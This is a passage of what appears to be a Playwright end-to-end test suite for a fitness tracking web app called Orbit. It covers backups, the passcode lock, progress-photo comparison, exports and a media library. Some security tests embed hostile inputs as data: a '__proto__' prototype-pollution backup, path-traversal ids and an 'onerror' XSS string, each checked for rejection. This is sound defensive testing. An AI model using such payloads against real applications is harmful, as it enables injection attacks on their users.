    ok(/Wrong passphrase/.test(res.wrong), res.wrong); eq(res.kind, 'backup'); eq(res.n, res.live);
  });

  await step('restore from an encrypted file through the UI replaces the data', async () => {
    const enc = await page.evaluate(() => Store.buildBackup({ media: false, passphrase: 'correct horse battery' }));
    const file = path.join(tmp, 'test.orbitbackup'); fs.writeFileSync(file, enc);
    await page.evaluate(async () => { await Store.append('weight_logged', { date: '2020-01-01', kg: 99 }); });
    const withExtra = await page.evaluate(() => Store.getEvents().length);
    await route(page, '#/settings');
    await page.locator('input[aria-label="Choose a backup file"]').setInputFiles(file);
    await page.getByLabel('Passphrase').fill('correct horse battery');
    await page.getByRole('button', { name: 'Open' }).click();
    await page.getByRole('button', { name: 'Restore', exact: true }).click();
    await page.waitForSelector('text=Week 1 of 26');
    eq(await page.evaluate(() => Store.getEvents().length), withExtra - 1, 'the extra event is gone after restore');
  });

  await step('a backup with prototype-pollution keys is rejected', async () => {
    const evil = '{"orbit":1,"kind":"backup","events":[{"seq":1,"ts":"t","type":"weight_logged","data":{"__proto__":{"polluted":1}}}]}';
    const msg = await page.evaluate(async (t) => { try { await Store.readImport(t); return 'accepted'; } catch (e) { return e.message; } }, evil);
    ok(/unsafe/i.test(msg), msg);
    eq(await page.evaluate(() => ({}).polluted), undefined);
  });

  // ----- lock -----
  await step('passcode lock: wrong code refused, right code opens, hash not plaintext', async () => {
    await route(page, '#/settings');
    await page.getByRole('switch', { name: 'Passcode' }).click();
    await page.getByLabel('New passcode (4 to 8 digits)').fill('4826');
    await page.getByLabel('Repeat passcode').fill('4826');
    await page.getByRole('button', { name: 'Turn on' }).click();
    await page.waitForTimeout(600);
    const rec = await page.evaluate(() => Store.getMeta('pin'));
    ok(rec && rec.hash && !JSON.stringify(rec).includes('4826'), 'pin is hashed');
    await page.getByRole('button', { name: 'Lock now' }).click();
    await page.waitForSelector('#lock:not(.hidden)');
    await page.locator('#lock input').fill('1111'); await page.locator('#lock').getByRole('button', { name: 'Unlock' }).click();
    await page.waitForSelector('text=That is not it.');
    await page.locator('#lock input').fill('4826'); await page.locator('#lock').getByRole('button', { name: 'Unlock' }).click();
    await page.waitForSelector('#lock.hidden', { state: 'attached' });
  });

  await step('erase everything wipes the data', async () => {
    await route(page, '#/settings');
    await page.getByRole('button', { name: 'Erase everything on this device' }).click();
    await page.getByLabel('Type ERASE to confirm').fill('ERASE');
    await Promise.all([page.waitForNavigation().catch(() => {}), page.getByRole('button', { name: 'Erase', exact: true }).click()]);
    await page.waitForSelector('text=Track the change.');
    eq(await page.evaluate(() => Store.getEvents().length), 0);
  });

  await step('profile file (fictional) builds a plan without the onboarding questions', async () => {
    const prof = { orbit: 1, kind: 'profile', answers: { name: 'Test', sex: 'male', age: 31, heightCm: 180, weightKg: 82, units: { body: 'kg', length: 'in', lift: 'lb' }, measurements: { waist: 86, chest: 100 }, goal: 'build', days: [1, 3, 5], sessionMin: 60, timeOfDay: 'AM', diet: 'Vegetarian', creatine: false,
      training: { split: 'auto', repStyle: 'mixed', sets: 3, deload: 'planned' }, lifts: [{ id: 'flat_db_press', on: true, weight: 40, reps: 8 }] } };
    const file = path.join(tmp, 'profile.json'); fs.writeFileSync(file, JSON.stringify(prof));
    await page.locator('input[type=file]').first().setInputFiles(file);
    await page.getByRole('button', { name: 'Build my plan' }).click();
    await page.waitForSelector('text=Week 1 of 26');
    eq(await page.evaluate(() => Object.keys(Store.getState().plan.lifts)), ['flat_db_press']);
  });

  await step('no console errors or warnings during the whole run (except expected provider failures)', async () => {
    const unexpected = problems.filter((p) => !/401|Failed to load resource|evil\.example|net::ERR|Refused to (connect|execute|load)|requires 'Trusted|Trusted Type|violates|EvalError|unsafe-eval|Executing inline/i.test(p));
    eq(unexpected, [], 'unexpected console output');
  });
  await ctx.close();

  // ================= a plan that is five weeks old =================
  const octx = await browser.newContext({ viewport: { width: 390, height: 844 } });
  const opage = await octx.newPage(); opage.setDefaultTimeout(5000);
  await opage.goto(base);
  await opage.waitForSelector('text=Track the change.');
  await step('monthly check-in and backup nudge appear for a five-week-old plan and can be acted on', async () => {
    await opage.evaluate(async () => {
      const start = Engine.addDays(U.today(), -37);
      const a = { sex: 'male', age: 31, heightCm: 180, weightKg: 82, units: { body: 'kg', length: 'cm', lift: 'lb' }, measurements: { waist: 86 }, goal: 'recomp', days: [1, 2, 3, 4, 5, 6, 0], startDate: start,
        training: { split: 'auto', dbStep: 2.5, machineStep: 5, sets: 3, repStyle: 'mixed', deload: 'planned' }, lifts: [{ id: 'flat_db_press', on: true, weight: 40, reps: 8 }] };
      await Store.append('profile_created', { profile: a, plan: Engine.buildPlan(a) });
      for (let d = 30; d >= 0; d--) await Store.append('weight_logged', { date: Engine.addDays(U.today(), -d), kg: 82 - d * 0.03 + 0.9 }); // dropping about 0.2 kg a week... then rising
      await Store.append('measurement_logged', { date: U.today(), site: 'waist', cm: 86.2 });
      location.hash = '#/today'; App.render();
    });
    await opage.waitForSelector('text=Monthly check-in');
    await opage.waitForSelector('text=Back up your data');
    const seen = await opage.evaluate(() => Store.getSettings().reviewSeen || 0);
    eq(seen, 0);
    await opage.getByRole('button', { name: /Got it|Keep as is/ }).click();
    await opage.waitForTimeout(250);
    ok(await opage.locator('text=Monthly check-in').count() === 0, 'card dismissed for this month');
  });
  await octx.close();

  // ================= photo trend, compare and saving =================
  console.log('\nPhoto trend');
  const tctx = await browser.newContext({ viewport: { width: 390, height: 844 }, acceptDownloads: true });
  const tpage = await tctx.newPage(); tpage.setDefaultTimeout(6000);
  const tproblems = await collect(tpage);
  const outside = []; // anything a photo screen or export sends to another origin (there must be none)
  tpage.on('request', (r) => { const u = r.url(); if (!u.startsWith(base.replace('/index.html', '')) && !/^(blob|data):/.test(u)) outside.push(u); });
  await tpage.goto(base);
  await tpage.waitForSelector('text=Track the change.');
  // fictional data: three Front check-ins (weeks 1, 5, 9) with a weigh-in and measurements each; cm and kg
  await tpage.evaluate(async () => {
    const start = Engine.addDays(U.today(), -70), at = (w) => Engine.addDays(start, (w - 1) * 7);
    const a = { sex: 'male', age: 31, heightCm: 180, weightKg: 82, units: { body: 'kg', length: 'cm', lift: 'lb' }, measurements: { waist: 86, chest: 100 }, goal: 'recomp', days: [1, 2, 3, 4, 5], startDate: start,
      training: { split: 'auto', dbStep: 2.5, machineStep: 5, sets: 3, repStyle: 'mixed', deload: 'planned' }, lifts: [{ id: 'flat_db_press', on: true, weight: 40, reps: 8 }] };
    await Store.append('profile_created', { profile: a, plan: Engine.buildPlan(a) });
    await Store.saveSettings({ bodyUnit: 'kg', lenUnit: 'cm', liftUnit: 'lb', onboardedAt: new Date().toISOString() });
    const kg = { 1: 82, 5: 81, 9: 80.2 }, waist = { 1: 86, 5: 85, 9: 84.2 }, chest = { 1: 100, 5: 100.5, 9: 101.2 };
    const fig = (w) => new Promise((res) => {
      const c = document.createElement('canvas'); c.width = 300; c.height = 400; const x = c.getContext('2d');
      x.fillStyle = 'hsl(' + (w * 20) + ',30%,25%)'; x.fillRect(0, 0, 300, 400); x.fillStyle = '#c9d6cf'; x.beginPath(); x.arc(150, 80, 30, 0, 7); x.fill(); x.fillRect(90, 130, 120, 220);
      c.toBlob(res, 'image/jpeg', 0.8);
    });
    for (const w of [1, 5, 9]) {
      await Store.append('weight_logged', { date: at(w), kg: kg[w] });
      await Store.append('measurement_logged', { date: at(w), site: 'waist', cm: waist[w] });
      await Store.append('measurement_logged', { date: at(w), site: 'chest', cm: chest[w] });
      const id = 'p_' + w + '_front_t';
      await Store.putMedia(id, await fig(w), { week: w, angle: 'Front' });
      await Store.append('photo_added', { date: at(w), week: w, angle: 'Front', id });
    }
  });
  // Photos are labelled by the date of the weekly check-in, never "Week 5" or "Wk 5". These give the expected text for one of the three seeded photos.
  const longAt = (w) => tpage.evaluate((w) => U.longDate(Engine.addDays(Engine.addDays(U.today(), -70), (w - 1) * 7)), w);
  const shortAt = (w) => tpage.evaluate((w) => U.shortDate(Engine.addDays(Engine.addDays(U.today(), -70), (w - 1) * 7)), w);
  const isoAt = (w) => tpage.evaluate((w) => Engine.addDays(Engine.addDays(U.today(), -70), (w - 1) * 7), w);
  const noWeekWords = async (where) => { const t = await tpage.locator('body').innerText(); ok(!/\b(Week|Wk|week|wk) ?\d/.test(t), where + ' shows no week numbers: ' + (t.match(/.{0,20}\b(Week|Wk|week|wk) ?\d.{0,20}/) || [''])[0]); };
  const eventsBefore = await tpage.evaluate(() => Store.getEvents().length);
  const mediaBefore = await tpage.evaluate(async () => (await Store.allMedia()).length);

  await step('photos screen offers the trend and compare, and shows the first and latest photo', async () => {
    await route(tpage, '#/photos');
    await tpage.getByText('Your photo trend').waitFor();
    await noWeekWords('photo check-in screen');
    ok(new RegExp(await shortAt(1)).test(await tpage.locator('.trendthumb .lbl').first().innerText()), 'first thumbnail is labelled with its date');
    eq(await tpage.locator('.trendthumb').count(), 2);
    ok(await tpage.locator('.trendthumb.blur').count() === 2, 'thumbnails follow the blur setting');
    await tpage.getByRole('link', { name: 'See trend' }).click();
    await tpage.waitForSelector('.stage');
    eq(await tpage.evaluate(() => location.hash), '#/photos/trend');
  });

  await step('trend: latest check-in first, blurred until tapped, with the numbers and green only toward the goal', async () => {
    const stage = tpage.locator('.stage');
    ok(await stage.evaluate((el) => el.classList.contains('blur')), 'blurred by default');
    ok(/Blurred/.test(await tpage.locator('.stage-badge').innerText()), 'badge says blurred');
    eq(await tpage.locator('.stage-cap').innerText(), await longAt(9)); // starts on the latest check-in, named by its date
    await noWeekWords('trend');
    await stage.click();
    ok(!(await stage.evaluate((el) => el.classList.contains('blur'))), 'tap reveals');
    const cards = await tpage.locator('.tstat').allInnerTexts();
    ok(/Weight/.test(cards[0]) && /80\.2/.test(cards[0]) && /-1\.8 kg/.test(cards[0]), 'weight card: ' + cards[0]);
    ok(/Waist/.test(cards[1]) && /84\.2/.test(cards[1]) && /-1\.8 cm/.test(cards[1]), 'waist card: ' + cards[1]);
    ok(/Chest/.test(cards[2]) && /101\.2/.test(cards[2]) && /\+1\.2 cm/.test(cards[2]), 'chest card: ' + cards[2]);
    ok(await tpage.locator('.tstat .td.good').count() === 2, 'waist down and chest up are toward the recomp goal');
    ok(await tpage.locator('.tstat').first().locator('.td.good, .td.coral').count() === 0, 'weight is neutral on a recomp');
    ok(await tpage.locator('.stage-img').evaluate((el) => el.complete && el.naturalWidth > 0), 'photo loaded from local storage');
  });

  await step('trend: keyboard scrub, play stops at the last check-in, empty weeks lead back to the check-in screen', async () => {
    const scrub = tpage.locator('.scrub');
    await scrub.focus();
    await tpage.keyboard.press('Home');
    eq(await tpage.locator('.stage-cap').innerText(), await longAt(1)); // Home goes to the first
    eq(await scrub.getAttribute('aria-valuetext'), await longAt(1)); // the slider announces the date
    await tpage.keyboard.press('ArrowRight');
    eq(await tpage.locator('.stage-cap').innerText(), await longAt(5)); // arrow moves to the next photo
    await tpage.locator('.tstat').first().waitFor();
    ok(/Starting point|-\d/.test(await tpage.locator('.tstat').first().innerText()), 'numbers follow the photo');
    await tpage.getByRole('button', { name: /^Speed/ }).click(); // 2x
    eq(await tpage.getByRole('button', { name: /^Speed/ }).innerText(), 'Speed 2x');
    await tpage.keyboard.press('Home');
    await tpage.getByRole('button', { name: 'Play through the check-ins' }).click();
    const last = await longAt(9); await tpage.waitForFunction((t) => document.querySelector('.stage-cap').textContent === t, last, { timeout: 5000 });
    await tpage.getByRole('button', { name: 'Play through the check-ins' }).waitFor(); // back to a play button: it stopped by itself
    const hrefs = await tpage.locator('a.tthumb.none').evaluateAll((els) => els.map((e) => e.getAttribute('href')));
    const slots = await tpage.locator('.tthumb').count(), have = await tpage.locator('button.tthumb').count();
    ok(slots >= 8, 'every week so far is a slot, not just a few fixed weeks: ' + slots);
    eq(hrefs.length, slots - have); ok(hrefs.every((x) => x === '#/photos'));
    const gap = await tpage.locator('a.tthumb.none').first().getAttribute('aria-label'), gapDate = await tpage.evaluate(() => U.shortDate(Engine.checkinDate(Store.getState().plan.startDate, 2, 5)));
    eq(gap, 'Add Front photo for ' + gapDate); // the first gap is the second weekly check-in, named by its date
    await tpage.locator('a.tthumb.none').first().click();
    await tpage.waitForSelector('.photogrid');
    eq(await tpage.getByLabel('Check-in date').locator('option:checked').innerText(), await tpage.evaluate(() => U.longDate(Engine.checkinDate(Store.getState().plan.startDate, 2, 5)))); // opens the check-in you tapped
    await noWeekWords('photo check-in');
  });

  await step('trend: an angle with no photos says so, and the waist chart shows the check-ins', async () => {
    await route(tpage, '#/photos/trend');
    await tpage.locator('.chart').first().waitFor();
    ok(await tpage.locator('.chart circle').count() >= 3, 'a dot per check-in');
    await tpage.getByRole('button', { name: 'Side', exact: true }).click();
    await tpage.getByText('You have no Side photos yet').waitFor();
    ok(await tpage.getByRole('button', { name: 'Download time-lapse' }).count() === 0, 'nothing to download yet');
    await tpage.getByRole('button', { name: 'Front', exact: true }).click();
    await tpage.waitForSelector('.stage');
  });

  await step('compare: pick any two dates; slider, side by side and overlay; numbers with the change', async () => {
    await tpage.getByRole('link', { name: 'Compare two dates' }).click();
    await tpage.waitForSelector('.cmp-slider');
    await noWeekWords('compare');
    eq(await tpage.getByLabel('Before').inputValue(), '1'); eq(await tpage.getByLabel('After').inputValue(), '9');
    const handle = tpage.locator('.cmp-handle');
    eq(await handle.getAttribute('aria-valuenow'), '50');
    await handle.focus(); await tpage.keyboard.press('ArrowRight');
    eq(await handle.getAttribute('aria-valuenow'), '55');
    const box = await tpage.locator('.cmp-slider').boundingBox();
    await tpage.mouse.move(box.x + box.width * 0.2, box.y + box.height / 2); await tpage.mouse.down(); await tpage.mouse.move(box.x + box.width * 0.8, box.y + box.height / 2); await tpage.mouse.up();
    ok(Number(await handle.getAttribute('aria-valuenow')) >= 75, 'dragging moves the handle');
    const rows = await tpage.locator('.cmprow:not(.head)').allInnerTexts();
    ok(rows.length === 3 && /Weight/.test(rows[0]) && /82\.0 kg/.test(rows[0]) && /80\.2 kg/.test(rows[0]) && /-1\.8 kg/.test(rows[0]), 'weight row: ' + rows[0]);
    ok(/Waist/.test(rows[1]) && /-1\.8 cm/.test(rows[1]), 'waist row: ' + rows[1]);
    ok(/Chest/.test(rows[2]) && /\+1\.2 cm/.test(rows[2]), 'chest row: ' + rows[2]);
    await tpage.getByRole('radio', { name: 'Side by side' }).click();
    eq(await tpage.locator('.cmp-side img').count(), 2);
    await tpage.getByRole('radio', { name: 'Overlay' }).click();
    await tpage.getByLabel('Blend').fill('20');
    eq(await tpage.locator('.cmp-over').evaluate((el) => el.style.opacity), '0.2');
    await tpage.getByLabel('After').selectOption('5'); await tpage.getByLabel('Before').selectOption('5');
    ok(await tpage.getByRole('button', { name: 'Download image' }).isDisabled(), 'the same check-in twice cannot be downloaded');
    await tpage.getByLabel('Before').selectOption('1'); await tpage.getByLabel('After').selectOption('9');
  });

  await step('download image: unblurred warning, PNG saved with a plain name, built and kept on this device only', async () => {
    await tpage.getByRole('radio', { name: 'Side by side' }).click();
    await tpage.getByRole('button', { name: 'Download image' }).click();
    const sheet = tpage.locator('#sheets');
    await sheet.getByText('The saved file shows your photos unblurred').waitFor();
    ok(/not encrypted/.test(await sheet.innerText()), 'says it is not encrypted');
    ok(await sheet.locator('.exprev.blur').count() === 1, 'the preview follows the blur setting');
    await sheet.getByRole('radio', { name: 'PNG' }).click();
    await sheet.getByRole('button', { name: 'Save image' }).click();
    await sheet.locator('img.resmedia').waitFor();
    const dim = await sheet.locator('img.resmedia').evaluate((el) => new Promise((r) => { const f = () => r([el.naturalWidth, el.naturalHeight]); el.complete && el.naturalWidth ? f() : (el.onload = f); }));
    eq(dim[0], 1808); ok(dim[1] > 1200, 'photos plus the measurements table: ' + dim[1]);
    const dl = tpage.waitForEvent('download');
    await sheet.getByRole('button', { name: /Download file|Save or share/ }).first().click();
    const d = await dl;
    eq(d.suggestedFilename(), 'orbit-compare-front-' + await isoAt(1) + '-to-' + await isoAt(9) + '.png');
    const p = await d.path(); const head = fs.readFileSync(p).subarray(0, 8);
    eq(Array.from(head), [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
    await sheet.getByRole('button', { name: 'Done' }).click();
    eq(await tpage.locator('#sheets .sheet').count(), 0);
  });

  await step('a saved JPEG is a plain re-drawn image with no camera or location block, in each layout', async () => {
    const r = await tpage.evaluate(async () => {
      const st = Store.getState(), cis = Engine.checkIns(st, 'Front').filter((c) => c.photo);
      const a = (await Store.getMedia(cis[0].photo.id)).blob, b = (await Store.getMedia(cis[2].photo.id)).blob;
      const out = [];
      for (const layout of ['side', 'slider', 'overlay']) {
        const blob = await MediaOut.composeComparison({ a: { blob: a, label: 'Fri, 4 Sep' }, b: { blob: b, label: 'Fri, 30 Oct' }, layout, format: 'jpeg', labels: true, rows: [{ name: 'Weight', a: '82.0 kg', b: '80.2 kg', change: '-1.8 kg', tone: '' }], head: ['Sep 4', 'Oct 30'] });
        const u8 = new Uint8Array(await blob.arrayBuffer());
        out.push({ layout, type: blob.type, soi: [u8[0], u8[1]], exif: new TextDecoder('latin1').decode(u8.subarray(0, 400)).includes('Exif') });
      }
      return out;
    });
    for (const x of r) { eq(x.type, 'image/jpeg', x.layout); eq(x.soi, [0xff, 0xd8], x.layout); ok(!x.exif, 'no Exif in ' + x.layout); }
  });

  await step('download time-lapse: warning, real video from the photos, cancel leaves nothing behind', async () => {
    if (!await tpage.evaluate(() => !!MediaOut.pickVideoMime())) { console.log('       (this browser cannot record MP4; skipped)'); return; }
    await route(tpage, '#/photos/trend');
    await tpage.getByRole('button', { name: 'Download time-lapse' }).click();
    const sheet = tpage.locator('#sheets');
    await sheet.getByText('The saved file shows your photos unblurred').waitFor();
    await sheet.getByRole('button', { name: 'Cancel' }).click();
    eq(await tpage.locator('#sheets .sheet').count(), 0);
    await tpage.getByRole('button', { name: 'Download time-lapse' }).click();
    await sheet.getByRole('radio', { name: 'Square' }).click();
    await sheet.getByRole('radio', { name: '0.5 s' }).click();
    await sheet.getByRole('button', { name: 'Create video' }).click();
    await sheet.locator('video.resmedia').waitFor({ timeout: 20000 });
    const v = await sheet.locator('video.resmedia').evaluate((el) => new Promise((res) => { const f = () => res({ w: el.videoWidth, h: el.videoHeight, d: el.duration, e: el.error && el.error.message }); el.readyState >= 1 ? f() : (el.onloadedmetadata = f, el.onerror = f); }));
    ok(!v.e, 'plays: ' + v.e); eq([v.w, v.h], [1080, 1080]); ok(v.d > 1 && v.d < 4, 'about 3 photos x 0.5 s: ' + v.d);
    const dl = tpage.waitForEvent('download');
    await sheet.getByRole('button', { name: /Download file|Save or share/ }).first().click();
    const d = await dl;
    ok(/^orbit-timelapse-front-\d{4}-\d{2}-\d{2}\.mp4$/.test(d.suggestedFilename()), 'file name: ' + d.suggestedFilename());
    const mp4 = fs.readFileSync(await d.path());
    ok(mp4.length > 1000, 'not empty');
    eq(mp4.subarray(4, 8).toString('latin1'), 'ftyp', 'a real MP4 container, not WebM');
    await sheet.getByRole('button', { name: 'Done' }).click();
  });

  await step('a cancelled recording stops cleanly and returns to the options', async () => {
    if (!await tpage.evaluate(() => !!MediaOut.pickVideoMime())) return;
    await tpage.getByRole('button', { name: 'Download time-lapse' }).click();
    const sheet = tpage.locator('#sheets');
    await sheet.getByRole('radio', { name: '1.5 s' }).click();
    await sheet.getByRole('button', { name: 'Create video' }).click();
    await sheet.getByRole('progressbar').waitFor();
    await sheet.getByRole('button', { name: 'Cancel' }).click();
    await sheet.getByRole('button', { name: 'Create video' }).waitFor();
    await sheet.getByRole('button', { name: 'Cancel' }).click();
  });

  await step('exports change nothing that is stored, add nothing to a backup and send nothing off the device', async () => {
    eq(await tpage.evaluate(() => Store.getEvents().length), eventsBefore);
    eq(await tpage.evaluate(async () => (await Store.allMedia()).length), mediaBefore);
    eq(outside, [], 'requests to other origins');
    const bad = /\b(null|undefined|NaN)\b/;
    for (const h of ['#/photos', '#/photos/trend', '#/photos/compare']) { await route(tpage, h); const t = await tpage.locator('#screen').innerText(); ok(!bad.test(t), h + ' shows: ' + (t.match(bad) || [])[0]); }
    eq(tproblems.filter((p) => !/Failed to load resource/.test(p)), [], 'console problems');
  });
  await tctx.close();

  // ================= library, form check and reel =================
  console.log('\nLibrary and reel');
  const lctx = await browser.newContext({ viewport: { width: 390, height: 844 }, acceptDownloads: true });
  await lctx.addInitScript(() => { window.showOpenFilePicker = undefined; }); // the plain picker: how iPhone Safari behaves
  const lpage = await lctx.newPage(); lpage.setDefaultTimeout(8000);
  const lproblems = await collect(lpage);
  const loutside = [];
  lpage.on('request', (r) => { const u = r.url(); if (!u.startsWith(base.replace('/index.html', '')) && !/^(blob|data):/.test(u) && !/api\.anthropic\.com/.test(u)) loutside.push(u); });
  const lai = await fakeAI(lpage, async () => ({ body: textReply('You can see the bar over mid-foot. Try keeping your chest up on the way out of the hole.') }));
  await lpage.goto(base);
  await lpage.waitForSelector('text=Track the change.');
  await lpage.evaluate(async () => {
    const start = Engine.addDays(U.today(), -70), at = (w) => Engine.addDays(start, (w - 1) * 7);
    const a = { sex: 'male', age: 31, heightCm: 180, weightKg: 82, units: { body: 'kg', length: 'cm', lift: 'lb' }, measurements: { waist: 86, chest: 100 }, goal: 'recomp', days: [1, 2, 3, 4, 5], startDate: start,
      training: { split: 'auto', dbStep: 2.5, machineStep: 5, sets: 3, repStyle: 'mixed', deload: 'planned' }, lifts: [{ id: 'flat_db_press', on: true, weight: 40, reps: 8 }] };
    await Store.append('profile_created', { profile: a, plan: Engine.buildPlan(a) });
    await Store.saveSettings({ bodyUnit: 'kg', lenUnit: 'cm', liftUnit: 'lb', onboardedAt: new Date().toISOString(), blurPhotos: false });
    for (const w of [1, 5]) {
      const b = await new Promise((res) => { const c = document.createElement('canvas'); c.width = 300; c.height = 400; const x = c.getContext('2d'); x.fillStyle = 'hsl(' + (w * 30) + ',30%,25%)'; x.fillRect(0, 0, 300, 400); c.toBlob(res, 'image/jpeg', 0.8); });
      await Store.putMedia('p_' + w + '_front_l', b, { week: w, angle: 'Front' });
      await Store.append('photo_added', { date: at(w), week: w, angle: 'Front', id: 'p_' + w + '_front_l' });
    }
  });
  // a photo and a short video made in the page, handed over through the file chooser like a real pick
  const fx = await lpage.evaluate(async () => {
    const photo = await new Promise((res) => { const c = document.createElement('canvas'); c.width = 1200; c.height = 1600; const x = c.getContext('2d'); x.fillStyle = '#284'; x.fillRect(0, 0, 1200, 1600); x.fillStyle = '#fff'; x.fillRect(400, 300, 400, 900); c.toBlob(res, 'image/jpeg', 0.9); });
    const mt = MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : 'video/mp4';
    const video = await new Promise((res) => {
      const c = document.createElement('canvas'); c.width = 640; c.height = 480; const x = c.getContext('2d');
      const rec = new MediaRecorder(c.captureStream(30), { mimeType: mt }); const ch = []; rec.ondataavailable = (e) => ch.push(e.data); rec.onstop = () => res(new Blob(ch, { type: mt }));
      rec.start(); let f = 0; const t = setInterval(() => { x.fillStyle = 'hsl(' + (f * 9) + ',60%,40%)'; x.fillRect(0, 0, 640, 480); x.fillStyle = '#fff'; x.fillRect(20 + f * 8, 200, 80, 80); if (++f > 60) { clearInterval(t); rec.stop(); } }, 33);
    });
    const buf = async (b) => Array.from(new Uint8Array(await b.arrayBuffer()));
    return { photo: await buf(photo), video: await buf(video), vtype: mt };
  });
  const lfiles = [{ name: 'IMG_0001.jpg', mimeType: 'image/jpeg', buffer: Buffer.from(fx.photo) }, { name: 'IMG_0002.' + (fx.vtype === 'video/webm' ? 'webm' : 'mp4'), mimeType: fx.vtype, buffer: Buffer.from(fx.video) }];
  const mediaKinds = () => lpage.evaluate(async () => { const all = await Store.allMedia(); const k = {}; for (const m of all) { const n = m.kind || 'progress'; k[n] = (k[n] || 0) + 1; } return k; });
  const pickFiles = async (buttonName, sheetScope) => {
    const [fc] = await Promise.all([lpage.waitForEvent('filechooser'), (sheetScope || lpage).getByRole('button', { name: buttonName }).click()]);
    await fc.setFiles(lfiles);
  };

  await step('library: add a photo and a video; only small previews are stored, never the originals', async () => {
    await route(lpage, '#/progress');
    await lpage.getByRole('link', { name: 'Open' }).last().click();
    await lpage.waitForSelector('text=Your workout photos and videos');
    const before = await mediaKinds();
    await pickFiles('Add photos or videos');
    const sheet = lpage.locator('#sheets');
    await sheet.getByText('Nothing is copied').waitFor();
    await sheet.getByRole('button', { name: 'Personal best' }).click();
    await sheet.getByRole('button', { name: 'Add', exact: true }).click();
    await lpage.waitForSelector('.libtile');
    eq(await lpage.locator('.libtile').count(), 2);
    const clips = await lpage.evaluate(() => Store.getState().clips.map((c) => ({ kind: c.kind, tag: c.tag, name: c.name, size: c.size, w: c.w, h: c.h, dur: c.dur, thumb: !!c.thumb })));
    eq(clips.map((c) => c.kind).sort(), ['photo', 'video']);
    ok(clips.every((c) => c.tag === 'Personal best' && c.thumb), 'tag and preview kept');
    const v = clips.find((c) => c.kind === 'video'); ok(v.dur > 1 && v.dur < 4, 'video length worked out even when the recorder left it out: ' + v.dur);
    const after = await mediaKinds();
    eq(after.thumb, 2, 'two previews');
    eq(after.progress, before.progress, 'progress photos untouched');
    const bytes = await lpage.evaluate(async () => (await Store.allMedia()).filter((m) => m.kind === 'thumb').reduce((t, m) => t + m.size, 0));
    ok(bytes < 60000, 'previews are small: ' + bytes + ' bytes against ' + (fx.photo.length + fx.video.length) + ' for the originals');
    const stored = await lpage.evaluate(() => JSON.stringify(Store.getEvents()));
    ok(!stored.includes('base64') && stored.length < 20000, 'no file content in the event log');
  });

  await step('library: adding the same files again skips them; edit, filter and remove work', async () => {
    await pickFiles('Add photos or videos');
    await lpage.locator('#sheets').getByRole('button', { name: 'Add', exact: true }).click();
    await lpage.waitForSelector('text=already in the library');
    eq(await lpage.evaluate(() => Store.getState().clips.length), 2);
    await lpage.waitForTimeout(300);
    await lpage.locator('.libtile').first().click();
    const sheet = lpage.locator('#sheets');
    await sheet.getByRole('button', { name: 'Form check' }).click();
    await sheet.getByLabel('Note').fill('Top set');
    await sheet.getByRole('button', { name: 'Save' }).click();
    await lpage.waitForTimeout(300);
    eq(await lpage.evaluate(() => Store.getState().clips.filter((c) => c.tag === 'Form check').length), 1);
    eq(await lpage.evaluate(() => Store.getState().clips.length), 2, 'an edit replaces, it does not duplicate');
    await lpage.getByRole('button', { name: 'Form check', exact: true }).click();
    eq(await lpage.locator('.libtile').count(), 1);
    await lpage.getByRole('button', { name: 'All', exact: true }).click();
    await lpage.locator('.libtile').last().click();
    await sheet.getByRole('button', { name: 'Remove' }).click();
    await sheet.getByRole('button', { name: 'Remove' }).last().click();
    await lpage.waitForTimeout(300);
    eq(await lpage.evaluate(() => Store.getState().clips.length), 1);
    eq((await mediaKinds()).thumb, 1, 'its preview went with it');
    await pickFiles('Add photos or videos');
    await lpage.locator('#sheets').getByRole('button', { name: 'Add', exact: true }).click();
    await lpage.waitForFunction(() => Store.getState().clips.length === 2);
  });

  await step('library: viewing the original asks for the file again and stores nothing', async () => {
    const before = await mediaKinds();
    await lpage.locator('.libtile').first().click();
    const sheet = lpage.locator('#sheets');
    const [fc] = await Promise.all([lpage.waitForEvent('filechooser'), sheet.getByRole('button', { name: /View the original|Watch the original/ }).click()]);
    await fc.setFiles(lfiles[0]);
    await lpage.locator('#sheets .resmedia').last().waitFor();
    ok(/not keeping a copy/.test(await lpage.locator('#sheets').innerText()), 'says it is not kept');
    eq(await mediaKinds(), before, 'no new media stored');
    await lpage.locator('#sheets').getByRole('button', { name: 'Close' }).last().click();
    await lpage.locator('#sheets').getByRole('button', { name: 'Save' }).click();
  });

  await step('library: previews and entries survive a backup and restore; a hostile entry in a backup is ignored', async () => {
    const r = await lpage.evaluate(async () => {
      const text = await Store.buildBackup({ media: true });
      const obj = JSON.parse(text);
      const thumbs = obj.media.filter((m) => m.kind === 'thumb').length;
      obj.events.push({ seq: 9999, ts: '2026-01-01T00:00:00Z', type: 'clip_added', data: { id: '../evil', kind: 'photo', date: '2026-01-01' }, src: 'x' });
      obj.events.push({ seq: 10000, ts: '2026-01-01T00:00:00Z', type: 'clip_added', data: { id: 'c_ok', kind: 'video', date: '2026-01-01', tag: '<img src=x onerror=alert(1)>', note: '<b>hi</b>', thumb: '../../etc', dur: 1e12 }, src: 'x' });
      const imp = await Store.readImport(JSON.stringify(obj));
      await Store.applyBackup(imp.payload);
      const st = Store.getState();
      const media = await Store.allMedia();
      return { thumbs, clips: st.clips.map((c) => ({ id: c.id, tag: c.tag, thumb: c.thumb, dur: c.dur })), restoredThumbs: media.filter((m) => m.kind === 'thumb').length };
    });
    eq(r.thumbs, 2, 'both previews were in the backup');
    eq(r.restoredThumbs, 2, 'and came back');
    ok(r.clips.every((c) => c.id !== '../evil'), 'a path-like id is dropped');
    const ok1 = r.clips.find((c) => c.id === 'c_ok');
    eq([ok1.tag, ok1.thumb, ok1.dur], ['Other', null, 36000], 'unknown tag, path-like preview id and huge length are clamped');
    eq(r.clips.length, 3);
    await lpage.evaluate(async () => { const c = Store.getState().clips.find((x) => x.id === 'c_ok'); await Store.voidEvent(c.seq); });
  });

  const videoTile = () => lpage.locator('.libtile', { has: lpage.locator('.dur') });
  const closeAll = async () => { for (let i = 0; i < 5; i++) { if (!await lpage.locator('#sheets .sheet').count()) break; await lpage.keyboard.press('Escape'); await lpage.waitForTimeout(150); } };

  await step('form check: without a key it offers one and sends nothing', async () => {
    await route(lpage, '#/library');
    await videoTile().click();
    await lpage.locator('#sheets').getByRole('button', { name: 'Ask the coach about form' }).click();
    await lpage.locator('#sheets').getByRole('button', { name: 'Add a key for this session' }).waitFor();
    eq(lai.length, 0);
    await closeAll();
  });

  await step('form check: shows the frames and where they go before anything is sent, then sends six pictures and saves nothing but the text', async () => {
